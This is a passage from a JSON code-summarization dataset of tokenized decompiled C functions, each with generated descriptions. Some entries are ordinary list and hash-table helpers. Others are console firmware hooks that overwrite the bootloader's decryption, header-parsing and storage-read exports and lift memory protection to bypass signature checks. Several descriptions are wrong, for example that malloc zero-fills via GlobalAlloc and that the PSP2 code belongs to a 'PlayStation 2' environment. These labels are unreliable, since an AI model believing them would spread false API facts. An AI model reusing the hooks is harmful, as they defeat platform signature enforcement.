            "(",
            "line",
            "[",
            "i",
            "]",
            ")",
            ";",
            "regHash",
            "=",
            "hash",
            "(",
            "line",
            ")",
            ";",
            "revH",
            "=",
            "revHash",
            "(",
            "line",
            ")",
            ";",
            "v5",
            "=",
            "evenOddHash",
            "(",
            "line",
            ")",
            ";",
            "revHa",
            "=",
            "(",
            "htbl",
            "-",
            ">",
            "size",
            "+",
            "revH",
            "%",
            "htbl",
            "-",
            ">",
            "size",
            ")",
            "%",
            "htbl",
            "-",
            ">",
            "size",
            ";",
            "EOHash",
            "=",
            "(",
            "htbl",
            "-",
            ">",
            "size",
            "+",
            "v5",
            "%",
            "htbl",
            "-",
            ">",
            "size",
            ")",
            "%",
            "htbl",
            "-",
            ">",
            "size",
            ";",
            "htbl",
            "-",
            ">",
            "tbl",
            "[",
            "(",
            "htbl",
            "-",
            ">",
            "size",
            "+",
            "regHash",
            "%",
            "htbl",
            "-",
            ">",
            "size",
            ")",
            "%",
            "htbl",
            "-",
            ">",
            "size",
            "]",
            "=",
            "populateTables",
            "+",
            "1",
            ";",
            "rtbl",
            "-",
            ">",
            "tbl",
            "[",
            "revHa",
            "]",
            "=",
            "populateTables",
            "+",
            "1",
            ";",
            "pushToList",
            "(",
            "&",
            "eotbl",
            "-",
            ">",
            "tbl",
            "[",
            "EOHash",
            "]",
            ",",
            "line",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code populates three hash tables and a list with data from a file, applying various hashing and manipulation techniques to the input lines, while incrementally updating table indices and pushing elements to the end of a linked list."
    },
    {
        "id": 412,
        "docstring_tokens": [
            "This",
            "code",
            "sets",
            "a",
            "file",
            "descriptor",
            "to",
            "listen",
            "for",
            "connections",
            "and",
            "exits",
            "the",
            "program",
            "with",
            "an",
            "error",
            "message",
            "if",
            "an",
            "error",
            "occurs",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "fd",
            ")",
            "{",
            "if",
            "(",
            "listen",
            "(",
            "fd",
            ",",
            "62",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"listen\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function named `setListen` which takes an integer file descriptor `fd`, sets it to listen for incoming connections with a backlog of 62, and exits with an error message if the listen operation fails."
    },
    {
        "id": 413,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "pushes",
            "a",
            "string",
            "onto",
            "a",
            "linked",
            "list",
            "by",
            "allocating",
            "memory",
            "for",
            "a",
            "new",
            "node",
            ",",
            "copying",
            "the",
            "string",
            "into",
            "the",
            "node",
            "'s",
            "value",
            ",",
            "and",
            "updating",
            "the",
            "head",
            "of",
            "the",
            "list",
            "accordingly",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "void",
            "*",
            "*",
            "head",
            ",",
            "char",
            "*",
            "str",
            ")",
            "{",
            "int",
            "strLen",
            ";",
            "linkedList_t",
            "*",
            "newHead",
            ";",
            "newHead",
            "=",
            "(",
            "linkedList_t",
            "*",
            ")",
            "malloc",
            "(",
            "0x10uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "newHead",
            ")",
            "perror",
            "(",
            "\"pushToList.c:__LINE__\"",
            ")",
            ";",
            "strLen",
            "=",
            "strlen",
            "(",
            "str",
            ")",
            "+",
            "1",
            ";",
            "newHead",
            "-",
            ">",
            "value",
            "=",
            "(",
            "char",
            "*",
            ")",
            "calloc",
            "(",
            "strLen",
            ",",
            "1uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "newHead",
            "-",
            ">",
            "value",
            ")",
            "perror",
            "(",
            "\"pushToList.c:__LINE__\"",
            ")",
            ";",
            "strncpy",
            "(",
            "newHead",
            "-",
            ">",
            "value",
            ",",
            "str",
            ",",
            "strLen",
            ")",
            ";",
            "if",
            "(",
            "*",
            "head",
            ")",
            "newHead",
            "-",
            ">",
            "next",
            "=",
            "(",
            "llist",
            "*",
            ")",
            "*",
            "head",
            ";",
            "else",
            "newHead",
            "-",
            ">",
            "next",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "head",
            "=",
            "newHead",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `malloc` is used for dynamic memory allocation in C, typically to request a block of memory from the heap of a specified size (in bytes) and return a pointer to the allocated memory, initialized to zero using `GlobalAlloc` in this case.",
            "The perror function is used to print an error message to the standard error stream with the provided error message as a string.",
            "The provided code snippets define and implement a custom `calloc` function in C, which serves as a memory allocation function, allocating memory for an array of elements and initializing them to zero, with additional adjustments and calls to other memory allocation functions based on certain conditions.",
            "The `strncpy` function is used to copy at most `n` characters from the source string to the destination string, ensuring that the destination string is null-terminated and limiting the number of characters copied to prevent buffer overflow."
        ],
        "longer_label": "The provided C code defines a function `pushToList` that dynamically allocates memory for a linked list node, initializes its value to a given string, and links it to the head of a linked list, handling memory allocation errors using `perror`."
    },
    {
        "id": 414,
        "docstring_tokens": [
            "This",
            "code",
            "writes",
            "the",
            "sizes",
            "and",
            "contents",
            "of",
            "three",
            "tables",
            "(",
            "htbl",
            ",",
            "rtbl",
            ",",
            "eotbl",
            ")",
            "to",
            "a",
            "given",
            "file",
            ",",
            "with",
            "special",
            "handling",
            "for",
            "linked",
            "lists",
            "in",
            "eotbl",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "FILE",
            "*",
            "outFile",
            ",",
            "table_t",
            "*",
            "htbl",
            ",",
            "table_t",
            "*",
            "rtbl",
            ",",
            "table_t",
            "*",
            "eotbl",
            ")",
            "{",
            "int",
            "i",
            ";",
            "linkedList_t",
            "*",
            "trPtr",
            ";",
            "fwrite",
            "(",
            "htbl",
            ",",
            "4uL",
            "L",
            ",",
            "1uL",
            "L",
            ",",
            "outFile",
            ")",
            ";",
            "fwrite",
            "(",
            "htbl",
            "-",
            ">",
            "tbl",
            ",",
            "8uL",
            "L",
            ",",
            "htbl",
            "-",
            ">",
            "size",
            ",",
            "outFile",
            ")",
            ";",
            "fwrite",
            "(",
            "rtbl",
            "-",
            ">",
            "tbl",
            ",",
            "8uL",
            "L",
            ",",
            "rtbl",
            "-",
            ">",
            "size",
            ",",
            "outFile",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "eotbl",
            "-",
            ">",
            "size",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "trPtr",
            "=",
            "(",
            "linkedList_t",
            "*",
            ")",
            "eotbl",
            "-",
            ">",
            "tbl",
            "[",
            "i",
            "]",
            ";",
            "if",
            "(",
            "trPtr",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "fputs",
            "(",
            "trPtr",
            "-",
            ">",
            "value",
            ",",
            "outFile",
            ")",
            ";",
            "fputc",
            "(",
            "0",
            ",",
            "outFile",
            ")",
            ";",
            "if",
            "(",
            "!",
            "trPtr",
            "-",
            ">",
            "next",
            ")",
            "break",
            ";",
            "trPtr",
            "=",
            "trPtr",
            "-",
            ">",
            "next",
            ";",
            "}",
            "}",
            "fputc",
            "(",
            "0",
            ",",
            "outFile",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code writes data from three tables (`htbl`, `rtbl`, and `eotbl`) along with linked lists to a specified file stream."
    },
    {
        "id": 415,
        "docstring_tokens": [
            "This",
            "code",
            "searches",
            "for",
            "a",
            "specific",
            "function",
            "in",
            "a",
            "module",
            "'s",
            "export",
            "table",
            "based",
            "on",
            "the",
            "library",
            "NID",
            "and",
            "function",
            "NID",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "int",
            "a2",
            ",",
            "int",
            "a3",
            ")",
            "{",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "for",
            "(",
            "i",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "32",
            ")",
            ";",
            "i",
            "!",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "36",
            ")",
            ";",
            "i",
            "+",
            "=",
            "32",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "16",
            ")",
            "=",
            "=",
            "a2",
            ")",
            "{",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "*",
            "(",
            "unsigned",
            "__int16",
            "*",
            ")",
            "(",
            "i",
            "+",
            "6",
            ")",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "24",
            ")",
            "+",
            "4",
            "*",
            "j",
            ")",
            "=",
            "=",
            "a3",
            ")",
            "return",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "28",
            ")",
            "+",
            "4",
            "*",
            "j",
            ";",
            "}",
            "}",
            "}",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code is a function named `get_export_func` which searches for a specific export function within a data structure, iterating through a list of exports and returning the address of the function if found, otherwise returning 0."
    },
    {
        "id": 416,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "various",
            "indices",
            "for",
            "different",
            "modules",
            ",",
            "loads",
            "the",
            "modules",
            ",",
            "and",
            "applies",
            "patches",
            "to",
            "specific",
            "modules",
            "if",
            "conditions",
            "are",
            "met",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "int",
            "a2",
            ",",
            "int",
            "a3",
            ",",
            "int",
            "a4",
            ")",
            "{",
            "int",
            "v4",
            ";",
            "int",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "int",
            "v9",
            ";",
            "int",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "unsigned",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "int",
            "v14",
            ";",
            "int",
            "(",
            "*",
            "*",
            "export_func",
            ")",
            "(",
            "void",
            ")",
            ";",
            "unsigned",
            "int",
            "v16",
            ";",
            "int",
            "(",
            "*",
            "*",
            "v17",
            ")",
            "(",
            "void",
            ")",
            ";",
            "unsigned",
            "int",
            "v18",
            ";",
            "int",
            "(",
            "__fastcall",
            "*",
            "*",
            "v19",
            ")",
            "(",
            "_DWORD",
            ")",
            ";",
            "unsigned",
            "int",
            "v20",
            ";",
            "int",
            "v21",
            ";",
            "int",
            "v22",
            ";",
            "int",
            "(",
            "*",
            "*",
            "v23",
            ")",
            "(",
            "void",
            ")",
            ";",
            "unsigned",
            "int",
            "v24",
            ";",
            "int",
            "(",
            "*",
            "*",
            "v25",
            ")",
            "(",
            "void",
            ")",
            ";",
            "unsigned",
            "int",
            "v26",
            ";",
            "int",
            "(",
            "*",
            "*",
            "v27",
            ")",
            "(",
            "void",
            ")",
            ";",
            "unsigned",
            "int",
            "v28",
            ";",
            "int",
            "v29",
            ";",
            "int",
            "v30",
            ";",
            "unsigned",
            "int",
            "v31",
            ";",
            "int",
            "v32",
            ";",
            "_DWORD",
            "*",
            "v33",
            ";",
            "_DWORD",
            "*",
            "v35",
            ";",
            "int",
            "v36",
            ";",
            "v4",
            "=",
            "-",
            "1",
            ";",
            "v6",
            "=",
            "0",
            ";",
            "v7",
            "=",
            "-",
            "1",
            ";",
            "v8",
            "=",
            "-",
            "1",
            ";",
            "v9",
            "=",
            "-",
            "1",
            ";",
            "v36",
            "=",
            "-",
            "1",
            ";",
            "while",
            "(",
            "v6",
            "<",
            "a3",
            ")",
            "{",
            "v35",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "4",
            "*",
            "v6",
            ")",
            ";",
            "if",
            "(",
            "*",
            "v35",
            ")",
            "{",
            "if",
            "(",
            "MEMORY",
            "[",
            "0x51013B30",
            "]",
            "(",
            "*",
            "v35",
            ",",
            "\"sysmem.skprx\"",
            ",",
            "12",
            ")",
            ")",
            "{",
            "if",
            "(",
            "MEMORY",
            "[",
            "0x51013B30",
            "]",
            "(",
            "*",
            "v35",
            ",",
            "\"display.skprx\"",
            ",",
            "13",
            ")",
            ")",
            "{",
            "if",
            "(",
            "MEMORY",
            "[",
            "0x51013B30",
            "]",
            "(",
            "*",
            "v35",
            ",",
            "\"sdif.skprx\"",
            ",",
            "10",
            ")",
            ")",
            "{",
            "if",
            "(",
            "MEMORY",
            "[",
            "0x51013B30",
            "]",
            "(",
            "*",
            "v35",
            ",",
            "\"authmgr.skprx\"",
            ",",
            "13",
            ")",
            ")",
            "{",
            "if",
            "(",
            "!",
            "MEMORY",
            "[",
            "0x51013B30",
            "]",
            "(",
            "*",
            "v35",
            ",",
            "\"sysstatemgr.skprx\"",
            ",",
            "17",
            ")",
            ")",
            "v4",
            "=",
            "v6",
            ";",
            "}",
            "else",
            "{",
            "v36",
            "=",
            "v6",
            ";",
            "}",
            "}",
            "else",
            "{",
            "v7",
            "=",
            "v6",
            ";",
            "}",
            "}",
            "else",
            "{",
            "v8",
            "=",
            "v6",
            ";",
            "}",
            "}",
            "else",
            "{",
            "v9",
            "=",
            "v6",
            ";",
            "}",
            "}",
            "+",
            "+",
            "v6",
            ";",
            "}",
            "v10",
            "=",
            "MEMORY",
            "[",
            "0x51001550",
            "]",
            "(",
            "a1",
            ",",
            "a2",
            ",",
            "a3",
            ",",
            "a4",
            ")",
            ";",
            "if",
            "(",
            "v9",
            ">",
            "=",
            "0",
            ")",
            "MEMORY",
            "[",
            "0x51017648",
            "]",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "4",
            "*",
            "v9",
            ")",
            ")",
            ";",
            "if",
            "(",
            "v8",
            ">",
            "=",
            "0",
            ")",
            "{",
            "v11",
            "=",
            "MEMORY",
            "[",
            "0x51017648",
            "]",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "4",
            "*",
            "v8",
            ")",
            ")",
            ";",
            "if",
            "(",
            "v11",
            ")",
            "{",
            "v12",
            "=",
            "__mrc",
            "(",
            "15",
            ",",
            "0",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "0xFFFF0000",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "MEMORY",
            "[",
            "0x51013A50",
            "]",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v11",
            "+",
            "132",
            ")",
            "+",
            "35216",
            ",",
            "&",
            "logo_data",
            ",",
            "2740",
            ")",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "v12",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "v7",
            ">",
            "=",
            "0",
            ")",
            "{",
            "v13",
            "=",
            "MEMORY",
            "[",
            "0x51017648",
            "]",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "4",
            "*",
            "v7",
            ")",
            ")",
            ";",
            "if",
            "(",
            "v13",
            ")",
            "{",
            "v14",
            "=",
            "v13",
            "+",
            "8",
            ";",
            "export_func",
            "=",
            "(",
            "int",
            "(",
            "*",
            "*",
            ")",
            "(",
            "void",
            ")",
            ")",
            "get_export_func",
            "(",
            "v13",
            "+",
            "8",
            ",",
            "-",
            "1764555014",
            ",",
            "1871532699",
            ")",
            ";",
            "v16",
            "=",
            "__mrc",
            "(",
            "15",
            ",",
            "0",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "0xFFFF0000",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "sdstor_read_sector_async",
            "=",
            "*",
            "export_func",
            ";",
            "*",
            "export_func",
            "=",
            "(",
            "int",
            "(",
            "*",
            ")",
            "(",
            "void",
            ")",
            ")",
            "sdstor_read_sector_async_patched",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "v16",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "v17",
            "=",
            "(",
            "int",
            "(",
            "*",
            "*",
            ")",
            "(",
            "void",
            ")",
            ")",
            "get_export_func",
            "(",
            "v14",
            ",",
            "-",
            "1764555014",
            ",",
            "-",
            "1185335726",
            ")",
            ";",
            "v18",
            "=",
            "__mrc",
            "(",
            "15",
            ",",
            "0",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "0xFFFF0000",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "sdstor_read_sector",
            "=",
            "*",
            "v17",
            ";",
            "*",
            "v17",
            "=",
            "(",
            "int",
            "(",
            "*",
            ")",
            "(",
            "void",
            ")",
            ")",
            "sdstor_read_sector_patched",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "v18",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "v19",
            "=",
            "(",
            "int",
            "(",
            "__fastcall",
            "*",
            "*",
            ")",
            "(",
            "_DWORD",
            ")",
            ")",
            "get_export_func",
            "(",
            "v14",
            ",",
            "-",
            "1764555014",
            ",",
            "1785829503",
            ")",
            ";",
            "v20",
            "=",
            "__mrc",
            "(",
            "15",
            ",",
            "0",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "0xFFFF0000",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "get_sd_context_part_validate_mmc",
            "=",
            "*",
            "v19",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "v20",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "v36",
            ">",
            "=",
            "0",
            ")",
            "{",
            "v21",
            "=",
            "MEMORY",
            "[",
            "0x51017648",
            "]",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "4",
            "*",
            "v36",
            ")",
            ")",
            ";",
            "if",
            "(",
            "v21",
            ")",
            "{",
            "v22",
            "=",
            "v21",
            "+",
            "8",
            ";",
            "v23",
            "=",
            "(",
            "int",
            "(",
            "*",
            "*",
            ")",
            "(",
            "void",
            ")",
            ")",
            "get_export_func",
            "(",
            "v21",
            "+",
            "8",
            ",",
            "2059358517",
            ",",
            "-",
            "213837695",
            ")",
            ";",
            "v24",
            "=",
            "__mrc",
            "(",
            "15",
            ",",
            "0",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "0xFFFF0000",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "sbl_parse_header",
            "=",
            "*",
            "v23",
            ";",
            "*",
            "v23",
            "=",
            "(",
            "int",
            "(",
            "*",
            ")",
            "(",
            "void",
            ")",
            ")",
            "sbl_parse_header_patched",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "v24",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "v25",
            "=",
            "(",
            "int",
            "(",
            "*",
            "*",
            ")",
            "(",
            "void",
            ")",
            ")",
            "get_export_func",
            "(",
            "v22",
            ",",
            "2059358517",
            ",",
            "-",
            "1983063508",
            ")",
            ";",
            "v26",
            "=",
            "__mrc",
            "(",
            "15",
            ",",
            "0",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "0xFFFF0000",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "sbl_set_up_buffer",
            "=",
            "*",
            "v25",
            ";",
            "*",
            "v25",
            "=",
            "sbl_set_up_buffer_patched",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "v26",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "v27",
            "=",
            "(",
            "int",
            "(",
            "*",
            "*",
            ")",
            "(",
            "void",
            ")",
            ")",
            "get_export_func",
            "(",
            "v22",
            ",",
            "2059358517",
            ",",
            "-",
            "1136516029",
            ")",
            ";",
            "v28",
            "=",
            "__mrc",
            "(",
            "15",
            ",",
            "0",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "0xFFFF0000",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "sbl_decrypt",
            "=",
            "*",
            "v27",
            ";",
            "*",
            "v27",
            "=",
            "sbl_decrypt_patched",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "v28",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "v4",
            ">",
            "=",
            "0",
            ")",
            "{",
            "v29",
            "=",
            "MEMORY",
            "[",
            "0x51017648",
            "]",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "4",
            "*",
            "v4",
            ")",
            ")",
            ";",
            "v30",
            "=",
            "v29",
            ";",
            "if",
            "(",
            "v29",
            ")",
            "{",
            "v31",
            "=",
            "__mrc",
            "(",
            "15",
            ",",
            "0",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "0xFFFF0000",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "v32",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v29",
            "+",
            "132",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v32",
            "+",
            "5376",
            ")",
            "=",
            "1198530561",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v32",
            "+",
            "3624",
            ")",
            "=",
            "536944641",
            ";",
            "MEMORY",
            "[",
            "0x51013A50",
            "]",
            "(",
            ")",
            ";",
            "MEMORY",
            "[",
            "0x51013A50",
            "]",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v30",
            "+",
            "132",
            ")",
            "+",
            "9312",
            ",",
            "\"ur0:\"",
            ",",
            "5",
            ")",
            ";",
            "MEMORY",
            "[",
            "0x51013A50",
            "]",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v30",
            "+",
            "132",
            ")",
            "+",
            "9134",
            ",",
            "\"ur0:tai/boot_config.txt\"",
            ",",
            "24",
            ")",
            ";",
            "v33",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            "*",
            ")",
            "(",
            "v30",
            "+",
            "132",
            ")",
            ";",
            "v33",
            "[",
            "76",
            "]",
            "=",
            "-",
            "1073415969",
            ";",
            "v33",
            "[",
            "77",
            "]",
            "=",
            "-",
            "1090500768",
            ";",
            "v33",
            "[",
            "78",
            "]",
            "=",
            "&",
            "sysstate_final_hook",
            ";",
            "sysstate_final",
            "=",
            "(",
            "int",
            ")",
            "v33",
            "+",
            "6345",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "v31",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "}",
            "}",
            "return",
            "v10",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a function (`module_load_patched`) that patches certain functions and exports in a module loader. Specifically, it checks for specific modules, and if found, modifies their behavior, likely for debugging or customization purposes, before returning a value."
    },
    {
        "id": 417,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "if",
            "a",
            "specific",
            "patch",
            "is",
            "disabled",
            "and",
            "if",
            "a",
            "certain",
            "flag",
            "is",
            "set",
            "before",
            "calling",
            "a",
            "decryption",
            "function",
            "with",
            "parameters",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g_sigpatch_disabled",
            "&",
            "&",
            "g_homebrew_decrypt",
            ")",
            "return",
            "g_sigpatch_disabled",
            ";",
            "else",
            "return",
            "sbl_decrypt",
            "(",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"bl_decrypt\" is designed to perform in-place decryption of a firmware image using ECC encryption, utilizing a corresponding private ECC key, allowing for secure firmware updates."
        ],
        "longer_label": "The function `sbl_decrypt_patched` conditionally returns either the result of `sbl_decrypt` or the value of `g_sigpatch_disabled` based on the states of `g_sigpatch_disabled` and `g_homebrew_decrypt`, potentially bypassing signature patching for homebrew firmware decryption."
    },
    {
        "id": 418,
        "docstring_tokens": [
            "The",
            "function",
            "sbl_set_up_buffer_patched",
            "checks",
            "if",
            "a",
            "certain",
            "condition",
            "is",
            "not",
            "met",
            "and",
            ",",
            "if",
            "so",
            ",",
            "returns",
            "a",
            "specific",
            "value",
            ",",
            "otherwise",
            ",",
            "it",
            "calls",
            "another",
            "function",
            "with",
            "the",
            "given",
            "parameters",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g_sigpatch_disabled",
            "&",
            "&",
            "g_homebrew_decrypt",
            ")",
            "return",
            "2",
            ";",
            "else",
            "return",
            "sbl_set_up_buffer",
            "(",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `bl_set_up_buffer` appears to be responsible for setting up buffers and initializing various global variables and function pointers related to system state, SD card interface, and signature patching in a PlayStation Portable 2 (PSP2) environment."
        ],
        "longer_label": "The function `sbl_set_up_buffer_patched` checks if signature patching is enabled and homebrew decryption is active in a PlayStation Portable 2 (PSP2) environment, returning 2 if both conditions are met, otherwise it invokes the `sbl_set_up_buffer` function."
    },
    {
        "id": 419,
        "docstring_tokens": [
            "This",
            "code",
            "function",
            "parses",
            "a",
            "header",
            "with",
            "possible",
            "patching",
            "for",
            "homebrew",
            "decryption",
            "if",
            "a",
            "specific",
            "condition",
            "is",
            "met",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "int",
            "a2",
            ",",
            "int",
            "a3",
            ",",
            "int",
            "a4",
            ")",
            "{",
            "int",
            "result",
            ";",
            "unsigned",
            "int",
            "v6",
            ";",
            "result",
            "=",
            "sbl_parse_header",
            "(",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g_sigpatch_disabled",
            ")",
            "{",
            "v6",
            "=",
            "__mrc",
            "(",
            "15",
            ",",
            "0",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "0xFFFF0000",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "g_homebrew_decrypt",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "result",
            ">",
            ">",
            "31",
            ";",
            "__mcr",
            "(",
            "15",
            ",",
            "0",
            ",",
            "v6",
            ",",
            "3",
            ",",
            "0",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "result",
            "<",
            "0",
            ")",
            "{",
            "result",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a4",
            "+",
            "168",
            ")",
            "=",
            "64",
            ";",
            "}",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"sbl_parse\" appears to be responsible for parsing configuration files related to the SBL (System Boot Loader) module in a PlayStation 2 development environment, potentially used for settings such as boot configurations, decryption options, and system state finalization."
        ],
        "longer_label": "The provided code appears to be a patched version of the \"sbl_parse_header\" function in a PlayStation 2 development environment, which includes conditional logic related to a signature patch disabling feature and modifications to system state variables."
    },
    {
        "id": 420,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "a",
            "sector",
            "asynchronously",
            ",",
            "but",
            "if",
            "the",
            "sector",
            "is",
            "0",
            "and",
            "there",
            "are",
            "more",
            "than",
            "0",
            "sectors",
            ",",
            "it",
            "redirects",
            "the",
            "read",
            "operation",
            "to",
            "sector",
            "1",
            "and",
            "continues",
            "reading",
            "from",
            "there",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
